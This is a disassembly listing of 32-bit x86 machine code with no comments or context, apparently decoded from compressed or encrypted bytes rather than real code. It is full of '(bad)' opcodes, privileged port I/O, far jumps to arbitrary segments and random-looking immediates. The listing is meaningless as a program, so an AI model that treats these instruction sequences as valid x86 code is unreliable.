  41713d:	stos   DWORD PTR es:[edi],eax
  41713e:	fcom   QWORD PTR [ebx]
  417140:	jmp    0xdba8515a
  417145:	clc    
  417146:	and    bh,BYTE PTR es:[esi-0x38]
  41714a:	call   0xfb1911cb
  41714f:	sub    DWORD PTR [edi+edi*1],eax
  417152:	(bad)  
  417153:	pop    ss
  417154:	inc    ebx
  417155:	pop    ebx
  417156:	test   eax,0x3d53dbbf
  41715b:	mov    eax,ds:0xd1b98efb
  417160:	cwde   
  417161:	(bad)  
  417162:	out    0xd8,al
  417164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417165:	cmp    eax,0x9ab03d8f
  41716a:	push   esi
  41716b:	push   0x429f0c33
  417170:	xor    BYTE PTR [ebp-0x1],cl
  417173:	pop    esi
  417174:	das    
  417175:	int    0x24
  417177:	or     al,0x61
  417179:	cli    
  41717a:	fild   WORD PTR [ebx]
  41717c:	loopne 0x41713c
  41717e:	lds    esp,FWORD PTR ds:0xaa516ca3
  417184:	or     edx,DWORD PTR [edi-0x4b711aae]
  41718a:	in     eax,0x9a
  41718c:	ja     0x41712b
  41718e:	add    esp,esp
  417190:	dec    eax
  417191:	push   esp
  417192:	popf   
  417193:	data16 mov WORD PTR [edx-0x167190be],es
  41719a:	stos   BYTE PTR es:[edi],al
  41719b:	lods   eax,DWORD PTR ds:[esi]
  41719c:	loopne 0x4171a5
  41719e:	(bad)  
  4171a0:	repz lahf 
  4171a2:	push   esi
  4171a3:	dec    ebp
  4171a4:	cli    
  4171a5:	int3   
  4171a6:	not    DWORD PTR [eax+0x2a5d215f]
  4171ac:	or     al,bl
  4171ae:	lods   eax,DWORD PTR ds:[esi]
  4171af:	inc    ebp
  4171b0:	sbb    eax,0x46258f8a
  4171b5:	popf   
  4171b6:	jae    0x417219
  4171b8:	pop    edx
  4171b9:	lock ret 0x3f50
  4171bd:	pop    ebx
  4171be:	rol    DWORD PTR [edi+0x28],0xa6
  4171c2:	stc    
  4171c3:	xchg   esi,eax
  4171c4:	inc    ecx
  4171c5:	daa    
  4171c6:	jne    0x41715c
  4171c8:	xor    ebx,DWORD PTR [ebx+0x7c]
  4171cb:	inc    ebx
  4171cc:	(bad)  
  4171cd:	ret    0xbc37
  4171d0:	sbb    al,0x43
  4171d2:	xchg   esp,eax
  4171d3:	sub    ch,BYTE PTR [eax+edx*8+0x45]
  4171d7:	cmp    edx,ebp
  4171d9:	nop
  4171da:	jmp    0x273f:0x889944df
  4171e1:	popf   
  4171e2:	xchg   ecx,eax
  4171e3:	jg     0x417216
  4171e5:	repnz and DWORD PTR ds:0x8c90a608,0x14aa0f80
  4171f0:	in     eax,0x69
  4171f2:	out    dx,eax
  4171f3:	jle    0x4171b9
  4171f5:	jg     0x417196
  4171f7:	cwde   
  4171f8:	or     esi,DWORD PTR [ecx-0x4b]
  4171fb:	gs aad 0x35
  4171fe:	out    0xa3,al
  417200:	test   BYTE PTR [ebp+0x12],0x76
  417204:	lock imul dh
  417207:	js     0x4171ef
  417209:	data16 idiv BYTE PTR [eax+0x3d]
  41720d:	jecxz  0x4171b2
  41720f:	sub    esi,esp
  417211:	sub    esi,DWORD PTR [edx+0x36]
  417214:	test   al,0x38
  417216:	mov    dh,0x92
  417218:	retf   
  417219:	ss out 0x51,al
  41721c:	inc    edi
  41721d:	pop    eax
  41721e:	ret    0x234f
  417221:	pop    ecx
  417222:	popf   
  417223:	fistp  WORD PTR [ebx]
  417225:	adc    ch,bh
  417227:	push   ecx
  417228:	push   ecx
  417229:	jns    0x4171ce
  41722b:	and    edx,DWORD PTR [esi]
  41722d:	(bad)
  417230:	add    DWORD PTR [ebx],ebp
  417232:	aas    
  417233:	push   ss
  417234:	adc    BYTE PTR [ebx+0x5630a69f],0xc5
  41723b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41723c:	aaa    
  41723d:	xchg   esi,eax
  41723e:	xlat   BYTE PTR ds:[ebx]
  41723f:	jno    0x4172a4
  417241:	lea    esp,[edi]
  417243:	mov    dh,0x29
  417245:	mov    ?,ebx
  417247:	adc    BYTE PTR [esi-0x4d9cda21],al
  41724d:	daa    
  41724e:	test   al,0xcc
  417250:	adc    al,0xbe
  417252:	aas    
  417253:	add    DWORD PTR [esi+0x549ef066],edx
  417259:	aad    0xa4
  41725b:	add    BYTE PTR [ebx-0x667c714f],ah
  417261:	and    ch,cl
  417263:	or     BYTE PTR [eax+0x18a4b8d],0x32
  41726a:	pop    DWORD PTR [edi+0x33ff55ab]
  417270:	jno    0x417268
  417272:	mov    esp,0x4902ba28
  417277:	retf   0x61cd
  41727a:	(bad)  
  41727b:	in     eax,0xa9
  41727d:	pop    ebx
  41727e:	fbld   TBYTE PTR [edi]
  417280:	and    al,BYTE PTR [edx-0x9]
  417283:	inc    ebp
  417284:	mov    esp,0xd61a3186
  417289:	jbe    0x4172a8
  41728b:	pop    esp
  41728c:	(bad)  
  41728d:	or     edx,DWORD PTR [ebx-0x3eb6d28c]
  417293:	clc    
  417294:	or     eax,DWORD PTR [edx-0x55]
  417297:	sbb    BYTE PTR [eax+0x27209a15],0x15
  41729e:	(bad)  
  41729f:	xchg   edi,eax
  4172a0:	imul   edx,eax,0x4cc80c59
  4172a6:	jb     0x417300
  4172a8:	jmp    0x7c7bb4f4
  4172ad:	(bad)  
  4172ae:	call   0xca5b:0x9d6f864d
  4172b5:	cwde   
  4172b6:	dec    ebp
  4172b7:	outs   dx,DWORD PTR ds:[esi]
  4172b8:	(bad)  
  4172b9:	test   ebp,0x3253d478
  4172bf:	inc    ebp
  4172c0:	mov    edi,0xff33c2fa
  4172c5:	mov    dl,0x2a
  4172c7:	neg    DWORD PTR [esi]
  4172c9:	fscale 
  4172cb:	lea    ebx,[edx+0x7b]
  4172ce:	rol    DWORD PTR [ebx],cl
  4172d0:	dec    esi
  4172d1:	push   esp
  4172d2:	inc    eax
  4172d3:	sub    eax,0xcaf5f8d7
  4172d8:	and    BYTE PTR [esi],cl
  4172da:	or     ah,BYTE PTR [edx]
  4172dc:	pop    edx
  4172dd:	in     eax,dx
  4172de:	sub    bh,BYTE PTR [edi+0x6dc020b5]
  4172e4:	test   DWORD PTR [eax+0x5c525e6],edx
  4172ea:	pop    ss
  4172eb:	jae    0x4172cd
  4172ed:	xor    al,0x7
  4172ef:	sbb    eax,0x9263a4a8
  4172f4:	(bad)  
  4172f5:	mov    ecx,0xaac73e63
  4172fa:	jge    0x417342
  4172fc:	jb     0x41730e
  4172fe:	mov    ecx,0x5a39860c
  417303:	stos   DWORD PTR es:[edi],eax
  417304:	sub    eax,0x84c5d3f0
  417309:	mov    BYTE PTR [ebx],dl
  41730b:	and    edi,esp
  41730d:	pop    ss
  41730e:	push   edi
  41730f:	rcl    DWORD PTR [edx-0x5],cl
  417312:	jg     0x4172ae
  417314:	xchg   edx,eax
  417315:	retf   
  417316:	out    0xe8,eax
  417318:	cwde   
  417319:	push   esp
  41731a:	pop    eax
  41731b:	lock mov ebp,?
  41731e:	push   esi
  41731f:	iret   
  417320:	xchg   ebx,eax
  417321:	test   al,0xf8
  417323:	and    eax,0x2e896435
  417328:	add    al,0xc
  41732a:	sbb    al,0x30
  41732c:	loop   0x41737a
  41732e:	retf   
  41732f:	mov    edi,ss
  417331:	xchg   esp,eax
  417332:	inc    eax
  417333:	stos   DWORD PTR es:[edi],eax
  417334:	jo     0x4172d5
  417336:	mov    esi,0x91c3ab87
  41733b:	sbb    al,0x7c
  41733d:	adc    ebp,DWORD PTR [ebx]
  41733f:	ss ret 0x8c49
  417343:	gs ret 
  417345:	cmp    al,0x4b
  417347:	jecxz  0x417319
  417349:	lock inc ebx
  41734b:	fild   WORD PTR [ebp+ebp*1-0x1d]
  41734f:	jg     0x417327
  417351:	int    0x48
  417353:	mov    dh,0xe6
  417355:	push   ss
  417356:	mov    eax,ds:0x799452d6
  41735b:	outs   dx,BYTE PTR ds:[esi]
  41735c:	xlat   BYTE PTR ds:[ebx]
  41735d:	(bad)  
  41735e:	or     al,0x56
  417360:	push   ebx
  417361:	rcr    BYTE PTR [ecx],0xe
  417364:	call   0x29571c3d
  417369:	adc    BYTE PTR [edx-0x6c79ab58],ch
  41736f:	xlat   BYTE PTR ds:[ebx]
  417370:	cmp    eax,0x1fa7c346
  417375:	clc    
  417376:	outs   dx,DWORD PTR ds:[esi]
  417377:	xchg   edi,eax
  417378:	daa    
  417379:	dec    esi
  41737a:	mov    ecx,0xcdbbe225
  41737f:	aaa    
  417380:	sub    DWORD PTR [edi-0x29bf74b5],ebp
  417386:	or     eax,0xbc7d7938
  41738b:	mov    al,ds:0x76591958
  417390:	inc    ecx
  417391:	cld    
  417392:	dec    ebp
  417393:	fidiv  DWORD PTR [eax+0x8]
  417396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417397:	fdiv   DWORD PTR [esi-0x75315d3b]
  41739d:	in     al,dx
  41739e:	pop    ebx
  41739f:	inc    edx
  4173a0:	jp     0x41740a
  4173a2:	inc    ebx
  4173a3:	das    
  4173a4:	mov    bh,0x41
  4173a6:	je     0x417369
  4173a8:	ins    BYTE PTR es:[edi],dx
  4173a9:	pop    eax
  4173aa:	neg    DWORD PTR [edi-0x4b]
  4173ad:	dec    eax
  4173ae:	dec    esi
  4173af:	fisubr WORD PTR [edx]
  4173b1:	int3   
  4173b2:	pop    ebx
  4173b3:	outs   dx,DWORD PTR ds:[esi]
  4173b4:	push   edx
  4173b6:	outs   dx,BYTE PTR ds:[esi]
  4173b7:	push   cs
  4173b8:	xor    DWORD PTR [esi+0x60],0xffffffed
  4173bc:	sti    
  4173bd:	clc    
  4173be:	lock stos BYTE PTR es:[edi],al
  4173c0:	ins    DWORD PTR es:[edi],dx
  4173c1:	shr    DWORD PTR [ecx-0x41],1
  4173c4:	sbb    DWORD PTR [edx],ecx
  4173c6:	std    
  4173c7:	bound  ebp,QWORD PTR [ecx-0x17521b52]
  4173cd:	es pop esi
  4173cf:	jmp    0x912b:0xb994611f
  4173d6:	sub    al,0x21
  4173d8:	retf   
  4173d9:	mov    WORD PTR [ebx],?
  4173db:	mov    BYTE PTR [ebx-0x2a],ch
  4173de:	int3   
  4173df:	cli    
  4173e0:	imul   esi,DWORD PTR [edx+0x39b05323],0xffffffea
  4173e7:	sub    BYTE PTR ds:0xabd93412,al
  4173ed:	xchg   ebx,eax
  4173ee:	cdq    
  4173ef:	mov    edx,0xfe3eef8a
  4173f4:	(bad)  
  4173f5:	loopne 0x4173ff
  4173f7:	push   edi
  4173f8:	mov    bh,0x5
  4173fa:	int3   
  4173fb:	mov    al,ds:0xe29a5148
  417400:	mov    bh,0x12
  417402:	sti    
  417403:	and    esi,ebx
  417405:	fmul   st,st(0)
  417407:	fisttp QWORD PTR [ebp+0x66]
  41740a:	inc    esi
  41740b:	cmp    al,0x9a
  41740d:	iret   
  41740e:	mov    bl,0x96
  417410:	and    DWORD PTR ds:0x79acfda5,eax
  417416:	dec    edx
  417417:	jp     0x4173b6
  417419:	out    0x9d,al
  41741b:	and    eax,0xd51b9be6
  417420:	cmp    ah,bl
  417422:	aam    0xcb
  417424:	jo     0x4173bd
  417426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417427:	daa    
  417428:	jge    0x4173bb
  41742a:	adc    al,0x30
  41742c:	(bad)  
  41742d:	retf   0xe23e
  417430:	fbstp  TBYTE PTR [ebx]
  417432:	cmp    cl,BYTE PTR [edx-0x252d62ba]
  417438:	or     al,0x13
  41743a:	add    DWORD PTR [esi-0x68588084],edx
  417440:	lods   eax,DWORD PTR ds:[esi]
  417441:	pusha  
  417442:	and    al,0xb1
  417444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417445:	pop    esi
  417446:	cmp    al,bl
  417448:	dec    edi
  417449:	repz adc bh,BYTE PTR [esi]
  41744c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41744d:	popa   
  41744e:	test   cl,0x45
  417451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417452:	mov    fs,WORD PTR [ebx]
  417454:	sbb    BYTE PTR [esi+0x1e],0xe2
  417458:	xlat   BYTE PTR ds:[ebx]
  417459:	stos   BYTE PTR es:[edi],al
  41745a:	and    eax,DWORD PTR ds:0x7a402e35
  417460:	scas   al,BYTE PTR es:[edi]
  417461:	inc    esp
  417462:	jmp    0xcd7d:0x6cd7a5a5
  417469:	and    DWORD PTR [eax],ecx
  41746b:	cmp    edi,DWORD PTR [eax-0x28]
  41746e:	push   0x30713611
  417473:	xchg   ebp,eax
  417474:	dec    DWORD PTR [ecx+ebx*4+0x1db0b551]
  41747b:	xor    DWORD PTR [esi-0x28],0x22
  41747f:	sti    
  417480:	jbe    0x4174a8
  417482:	adc    BYTE PTR [edi+0x5149758b],al
  417488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417489:	jns    0x417498
  41748b:	enter  0x5c2a,0xb3
  41748f:	stos   DWORD PTR es:[edi],eax
  417490:	and    eax,DWORD PTR [ebp+0x8]
  417493:	ret    
  417494:	arpl   bp,dx
  417496:	std    
  417497:	sub    BYTE PTR [eax],bh
  417499:	pop    esi
  41749a:	(bad)  
  41749b:	stc    
  41749c:	xchg   ecx,eax
  41749d:	retf   0xa5cc
  4174a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174a1:	stos   BYTE PTR es:[edi],al
  4174a2:	imul   ecx,DWORD PTR [edi-0x4f],0xef8126e2
  4174a9:	xchg   esi,eax
  4174aa:	(bad)  
  4174ab:	clc    
  4174ac:	jmp    0x36be6c5d
  4174b1:	enter  0x6308,0xd7
  4174b5:	(bad)  
  4174b6:	mov    BYTE PTR [eax],ah
  4174b8:	jmp    FWORD PTR ds:0x60a91fc8
  4174be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174bf:	fdiv   QWORD PTR [ecx]
  4174c1:	push   ebp
  4174c2:	push   0x39
  4174c4:	test   ah,0xfa
  4174c7:	adc    DWORD PTR [eax+0xcc75160],eax
  4174cd:	sub    DWORD PTR [eax+0x73],ebx
  4174d0:	fstp   st(5)
  4174d2:	pop    esp
  4174d3:	jo     0x417462
  4174d5:	loop   0x417510
  4174d7:	dec    esi
  4174d8:	stos   BYTE PTR es:[edi],al
  4174d9:	push   edx
  4174da:	aas    
  4174db:	push   ebp
  4174dc:	fisub  WORD PTR [ebp-0x67]
  4174df:	fcmovbe st,st(5)
  4174e1:	sub    eax,0xb27f9c42
  4174e6:	pop    ss
  4174e7:	gs out 0xec,al
  4174ea:	mov    ecx,0x15edb4ab
  4174ef:	push   es
  4174f0:	retf   0x9546
  4174f3:	outs   dx,DWORD PTR ds:[esi]
  4174f4:	push   edx
  4174f5:	pop    edi
  4174f6:	out    dx,al
  4174f7:	mov    ch,dl
  4174f9:	daa    
  4174fa:	clc    
  4174fb:	in     eax,0x65
  4174fd:	lahf   
  4174fe:	xchg   ebx,eax
  4174ff:	cld    
  417500:	imul   esp,DWORD PTR [ebx+0x5a465628],0x4d
  417507:	int3   
  417508:	jb     0x417530
  41750a:	add    al,0xd4
  41750c:	pop    ds
  41750d:	outs   dx,DWORD PTR ds:[esi]
  41750e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41750f:	rcr    BYTE PTR ds:0xb1862cd9,1
  417515:	int3   
  417516:	xor    bh,BYTE PTR gs:[esi+0x775ad48a]
  41751d:	jmp    0x6cdd:0x8a377a82
  417524:	push   cs
  417525:	xor    al,0x80
  417527:	xchg   edi,eax
  417528:	mov    ah,0xb4
  41752a:	pop    ss
  41752b:	ins    DWORD PTR es:[edi],dx
  41752c:	add    al,0xf0
  41752e:	(bad)  
  41752f:	xchg   edx,eax
  417530:	dec    esi
  417531:	adc    edx,eax
  417533:	xchg   ecx,eax
  417534:	jp     0x417529
  417536:	das    
  417537:	lea    esp,[edi-0x80]
  41753a:	rol    DWORD PTR [edi+edx*8-0x1c],0xe0
  41753f:	pop    edi
  417540:	dec    ch
  417542:	pop    ds
  417543:	or     BYTE PTR [esp+eax*4],dl
  417546:	xchg   ebx,eax
  417547:	das    
  417548:	xor    eax,0x9f3eb4a6
  41754d:	sub    al,0x83
  41754f:	mov    ds:0xf3d008f7,eax
  417554:	call   0x193f:0x79ae53fb
  41755b:	or     esp,ebp
  41755d:	loope  0x417591
  41755f:	xor    edi,DWORD PTR [esi-0x2913ad]
  417565:	outs   dx,BYTE PTR ds:[esi]
  417566:	es or  eax,0x54accef
  41756c:	adc    BYTE PTR [esi+0x262a3dcf],dh
  417572:	call   0xabc0:0x52561738
  417579:	add    al,BYTE PTR [eax]
  41757b:	std    
  41757c:	push   edi
  41757d:	inc    ebp
  41757e:	xchg   edx,eax
  41757f:	xor    DWORD PTR [esi-0x37],esp
  417582:	jae    0x4175bb
  417584:	dec    esi
  417585:	es and esi,DWORD PTR cs:[ecx+0x68001ed2]
  41758d:	inc    ebp
  41758e:	div    BYTE PTR [ebp+0x68]
  417591:	sub    ebp,DWORD PTR ds:0x69535039
  417597:	sub    al,0x81
  417599:	clc    
  41759a:	add    ebp,ebp
  41759c:	call   0x6ffe:0xf1bd911a
  4175a3:	mov    edi,0x9423f425
  4175a8:	into   
  4175a9:	call   0x8710:0x3c06e84e
  4175b0:	sahf   
  4175b1:	jp     0x41758d
  4175b3:	push   ss
  4175b4:	cs jp  0x41761f
  4175b7:	out    0x94,al
  4175b9:	adc    ebx,eax
  4175bb:	pushf  
  4175bc:	sub    cl,BYTE PTR [esi]
  4175be:	jnp    0x4175ec
  4175c0:	mov    edi,DWORD PTR [ebp-0x494c1c72]
  4175c6:	andnps xmm6,XMMWORD PTR [ebx]
  4175c9:	push   cs
  4175ca:	and    edx,DWORD PTR [ecx+0x38db0107]
  4175d0:	cmp    DWORD PTR [ebp-0x32915631],edx
  4175d6:	lds    ecx,FWORD PTR [edx+ebx*8]
  4175d9:	jae    0x4175b1
  4175db:	scas   al,BYTE PTR es:[edi]
  4175dc:	dec    ebp
  4175dd:	adc    cl,BYTE PTR [edi-0xe]
  4175e0:	hlt    
  4175e1:	pop    ds
  4175e2:	je     0x417569
  4175e4:	pop    ebp
  4175e5:	rcr    BYTE PTR [ebp-0x2d74a32d],0x95
  4175ec:	xchg   BYTE PTR [edx+0x54fbced8],ah
  4175f2:	adc    DWORD PTR [eax-0x73223096],ecx
  4175f8:	mov    bh,0xb6
  4175fa:	jmp    0xd43c:0xd65480dd
  417601:	(bad)  
  417602:	imul   edx,DWORD PTR [ebx+esi*2],0x740114fe
  417609:	adc    bl,dh
  41760b:	push   eax
  41760c:	cmp    esi,DWORD PTR [edx-0x53]
  41760f:	jecxz  0x4175fc
  417611:	xor    eax,DWORD PTR [edx-0xe]
  417614:	or     eax,0x7d15d14f
  417619:	nop
  41761a:	sub    DWORD PTR [eax-0x1aaf4116],edi
  417620:	sub    eax,0xf360cf9d
  417625:	js     0x417650
  417627:	xor    dh,BYTE PTR [ecx]
  417629:	push   cs
  41762a:	test   eax,0xf8edb890
  41762f:	mov    ecx,0x94aef349
  417634:	pop    edx
  417635:	imul   esi,DWORD PTR [eax],0xffffffd4
  417638:	jecxz  0x4176b5
  41763a:	daa    
  41763b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41763c:	mov    bh,0xdb
  41763e:	and    BYTE PTR [ecx-0x4dded59e],0xfe
  417645:	int3   
  417646:	shr    BYTE PTR [ebp+0x2b],cl
  417649:	lock push ss
  41764b:	in     al,dx
  41764c:	mov    DWORD PTR [ecx+eax*2],esp
  41764f:	jmp    0x2d2f708c
  417654:	inc    eax
  417655:	inc    edx
  417656:	mov    DWORD PTR [ecx+eax*1+0x674c4510],ebx
  41765d:	adc    edx,eax
  41765f:	mov    ah,0x39
  417661:	mov    sp,0x9da3
  417665:	addr16 push cs
  417667:	mov    ah,BYTE PTR [ecx+0x5d]
  41766a:	push   edx
  41766b:	mov    dl,al
  41766d:	ret    
  41766e:	test   al,0x8b
  417670:	icebp  
  417671:	sbb    edx,ebx
  417673:	xchg   ecx,eax
  417674:	ins    DWORD PTR es:[edi],dx
  417675:	sub    eax,0x139e69a9
  41767a:	xor    al,0x41
  41767c:	inc    ebx
  41767d:	nop
  41767e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41767f:	sub    al,0x3a
  417681:	in     ax,dx
  417683:	sar    DWORD PTR [edx-0xd3afb49],cl
  417689:	stc    
  41768a:	jb     0x417648
  41768c:	lods   eax,DWORD PTR ds:[esi]
  41768d:	ret    0x6b26
  417690:	mov    bh,0x4f
  417692:	icebp  
  417693:	daa    
  417694:	cmp    BYTE PTR [esi+0x6ad43e74],0x99
  41769b:	inc    ecx
  41769c:	xor    al,0xee
  41769e:	jb     0x417676
  4176a0:	aam    0x60
  4176a2:	je     0x4176ee
  4176a4:	adc    bl,BYTE PTR ds:0xd7022f5b
  4176aa:	test   esi,edi
  4176ac:	retf   
  4176ad:	mov    eax,0x78a637e6
  4176b2:	jecxz  0x4176e2
  4176b4:	push   0x2336b097
  4176b9:	and    al,0xfc
  4176bb:	cli    
  4176bc:	sub    eax,DWORD PTR [ebx]
  4176be:	aad    0x27
  4176c0:	test   al,0xaf
  4176c2:	into   
  4176c3:	pop    ss
  4176c4:	xchg   esp,eax
  4176c5:	les    edx,FWORD PTR [eax-0x46]
  4176c8:	inc    edx
  4176c9:	shl    DWORD PTR [ecx-0x798936e7],1
  4176cf:	mov    bh,bh
  4176d1:	mov    eax,0xa71ff86
  4176d6:	ss scas eax,DWORD PTR es:[edi]
  4176d8:	pop    ebp
  4176d9:	je     0x41768d
  4176db:	mov    ebp,0x2e3d461f
  4176e0:	mov    edi,gs
  4176e2:	sbb    eax,0x4c25c0c1
  4176e7:	pop    ds
  4176e8:	repnz cmp DWORD PTR [edx-0x4d406872],ebx
  4176ef:	gs stos DWORD PTR es:[edi],eax
  4176f1:	jbe    0x4176d4
  4176f3:	fiadd  DWORD PTR [edx+0x2b]
  4176f6:	loope  0x417739
  4176f8:	or     DWORD PTR [eax],eax
  4176fa:	push   esp
  4176fb:	xchg   DWORD PTR ds:0x9d75cf59,ebp
  417701:	jecxz  0x41773c
  417703:	retf   0x46be
  417706:	shl    DWORD PTR [ebp+0x156626cc],cl
  41770c:	inc    ebx
  41770d:	mov    BYTE PTR [esp+eiz*8-0x110ce7e1],dh
  417714:	or     DWORD PTR [esi+ecx*8-0x7da279b0],esi
  41771b:	in     al,dx
  41771c:	jnp    0x417723
  41771e:	sub    al,0x3f
  417720:	jnp    0x41775f
  417722:	hlt    
  417723:	retf   0xb8
  417726:	sti    
  417727:	lods   al,BYTE PTR ds:[esi]
  417728:	ret    0xf7cc
  41772b:	je     0x4176dc
  41772d:	push   esp
  41772e:	xchg   esi,eax
  41772f:	cs (bad) 
  417731:	call   0x84ed19b7
  417736:	sahf   
  417737:	and    eax,0xf028f312
  41773c:	ja     0x41772d
  41773e:	or     edx,DWORD PTR [ebp-0x7e3195ad]
  417744:	sbb    dl,BYTE PTR [edx+ebp*1]
  417747:	pop    ss
  417748:	jl     0x4176e8
  41774a:	or     ebp,DWORD PTR [esp+esi*4+0x565007a2]
  417751:	or     edx,edx
  417753:	xchg   esp,eax
  417754:	cs ffreep st(7)
  417757:	sbb    DWORD PTR [eax+0x4],edx
  41775a:	repz hlt 
  41775c:	pop    edx
  41775d:	and    cl,ah
  41775f:	mov    ebp,0xa0b12283
  417764:	cld    
  417765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417766:	pop    ds
  417767:	dec    edi
  417768:	push   0x57a2220f
  41776d:	add    eax,0x75955bae
  417772:	cmp    DWORD PTR fs:0xd3d898d7,ebx
  417779:	and    DWORD PTR [ebx-0xbaa664e],0xffffffd7
  417780:	mov    ds:0x82d80ee2,al
  417785:	xchg   esi,eax
  417786:	retf   0x99cb
  417789:	stc    
  41778a:	lock daa 
  41778c:	iret   
  41778d:	and    ebx,edx
  41778f:	scas   eax,DWORD PTR es:[edi]
  417790:	fwait
  417791:	pop    ebx
  417792:	test   ch,dl
  417794:	aad    0x4c
  417796:	test   DWORD PTR [ecx+0x44],esp
  417799:	pop    eax
  41779a:	(bad)  
  41779b:	xchg   esi,eax
  41779c:	xchg   esp,eax
  41779d:	xlat   BYTE PTR ds:[ebx]
  41779e:	fs xchg edx,eax
  4177a0:	(bad)  
  4177a1:	leave  
  4177a2:	jns    0x4177d0
  4177a4:	push   edi
  4177a5:	jb     0x41779a
  4177a7:	or     dh,bl
  4177a9:	sub    ebp,DWORD PTR [ecx+0x3]
  4177ac:	pushf  
  4177ad:	and    DWORD PTR [edi-0x1c2deea6],esp
  4177b3:	or     BYTE PTR [edi+0x30],cl
  4177b6:	div    BYTE PTR [ebx]
  4177b8:	cli    
  4177b9:	and    esi,esi
  4177bb:	(bad)  
  4177bc:	xor    DWORD PTR [esi-0xa],ebx
  4177bf:	dec    esp
  4177c0:	nop
  4177c1:	scas   eax,DWORD PTR es:[edi]
  4177c2:	stos   BYTE PTR es:[edi],al
  4177c3:	inc    eax
  4177c4:	and    al,0x59
  4177c6:	fsub   DWORD PTR [edi-0x7034d53]
  4177cc:	xor    dh,BYTE PTR [ebx+0x16]
  4177cf:	and    esp,DWORD PTR [ebx-0x2e3d59d6]
  4177d5:	fdivrp st(7),st
  4177d7:	cmc    
  4177d8:	and    esi,DWORD PTR [ecx+ecx*2]
  4177db:	cmp    bh,BYTE PTR [ebx]
  4177dd:	push   0x2b
  4177df:	rcl    BYTE PTR [edx],0xc5
  4177e2:	stos   BYTE PTR es:[edi],al
  4177e3:	jle    0x4177ee
  4177e5:	push   ss
  4177e6:	arpl   WORD PTR [ebx+0x7d],di
  4177e9:	daa    
  4177ea:	sahf   
  4177eb:	lods   al,BYTE PTR ds:[esi]
  4177ec:	add    ch,dl
  4177ee:	int    0x12
  4177f0:	push   edx
  4177f1:	push   esi
  4177f2:	bound  ebp,QWORD PTR [eax+0x5d4b8fa2]
  4177f8:	call   0x191b9c57
  4177fd:	leave  
  4177fe:	push   eax
  4177ff:	shr    DWORD PTR [ecx-0x3e],cl
  417802:	mov    esp,0xeafde153
  417807:	arpl   si,cx
  417809:	sar    DWORD PTR [eax-0x7],cl
  41780c:	push   ecx
  41780d:	(bad)  
  41780e:	(bad)  
  41780f:	jbe    0x417814
  417811:	cdq    
  417812:	xchg   esp,eax
  417813:	fmul   st(5),st
  417815:	jb     0x41785c
  417817:	in     al,0xf1
  417819:	out    0xff,eax
  41781b:	push   ss
  41781c:	lock ds jae 0x417828
  417820:	sahf   
  417821:	adc    bh,BYTE PTR [eax]
  417823:	inc    esi
  417824:	inc    esp
  417825:	in     al,dx
  417826:	sar    DWORD PTR [esi-0x6],cl
  417829:	add    eax,0xb468c87f
  41782e:	mov    ebp,0x723c82aa
  417833:	xchg   edx,eax
  417834:	xor    eax,0x2e5ef9ed
  417839:	(bad)  
  41783b:	xchg   sp,ax
  41783d:	jae    0x4178ac
  41783f:	ret    
  417840:	cwde   
  417841:	mov    cl,BYTE PTR [ebx+0x67]
  417844:	inc    ebp
  417845:	jmp    0xcf8b:0x2d0fecf4
  41784c:	mov    ebp,0xde9d6b2a
  417851:	jecxz  0x41789a
  417853:	mov    ?,WORD PTR [ebp-0x5b065fd7]
  417859:	mov    al,0x1a
  41785b:	int3   
  41785c:	push   cs
  41785d:	mov    eax,0xb859d313
  417862:	xor    al,0x75
  417864:	xor    eax,0xeecfb5b0
  417869:	mul    DWORD PTR [esi]
  41786b:	out    dx,al
  41786c:	push   ds
  41786d:	jnp    0x417869
  41786f:	jns    0x4178c9
  417871:	lods   al,BYTE PTR ds:[esi]
  417872:	pop    ss
  417873:	inc    ebx
  417874:	mov    esp,0x45310289
  417879:	cdq    
  41787a:	jmp    0x417849
  41787c:	pop    ds
  41787d:	fdivr  QWORD PTR [edi-0x26d5822e]
  417883:	sub    dh,BYTE PTR [ebx+0x37eb75fe]
  417889:	in     eax,0x4a
  41788b:	mov    ss,eax
  41788d:	dec    ebp
  41788e:	jl     0x41784e
  417890:	dec    esi
  417891:	ds pop ds
  417893:	ret    
  417894:	enter  0x2cae,0xf0
  417898:	xor    al,0xd4
  41789a:	repnz xchg esi,eax
  41789c:	ss cdq 
  41789e:	pop    es
  41789f:	fdiv   QWORD PTR [esi+0x661b1061]
  4178a5:	(bad)  
  4178a6:	sbb    eax,0x3d193efd
  4178ab:	scas   eax,DWORD PTR es:[edi]
  4178ac:	mov    edx,edi
  4178ae:	sub    edx,DWORD PTR [ebp-0x4f]
  4178b1:	scas   eax,DWORD PTR es:[edi]
  4178b2:	and    eax,0x32f1a9dd
  4178b7:	push   0xf650b343
  4178bc:	enter  0xe182,0x4
  4178c0:	sub    eax,0x70c8e033
  4178c5:	(bad)  
  4178c6:	mov    eax,0x7bddb67d
  4178cb:	outs   dx,BYTE PTR ds:[esi]
  4178cc:	sbb    eax,0x3dac5c4e
  4178d1:	xor    eax,0x3b268e47
  4178d6:	or     ebx,DWORD PTR [ebx-0x4db73012]
  4178dc:	sub    BYTE PTR ds:0x9e13d1f0,al
  4178e2:	inc    ecx
  4178e3:	in     al,dx
  4178e4:	adc    BYTE PTR [ebx+0x785261bf],al
  4178ea:	jecxz  0x417948
  4178ec:	inc    edi
  4178ed:	xchg   ecx,eax
  4178ee:	mov    dh,BYTE PTR [esp+ebp*1+0x43f0368c]
  4178f5:	std    
  4178f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f7:	in     al,dx
  4178f8:	fs (bad) 
  4178fa:	mov    bl,0x34
  4178fc:	pop    esi
  4178fd:	inc    esp
  4178fe:	dec    esp
  4178ff:	mov    esi,0x3f4ccbc0
  417904:	jl     0x41790f
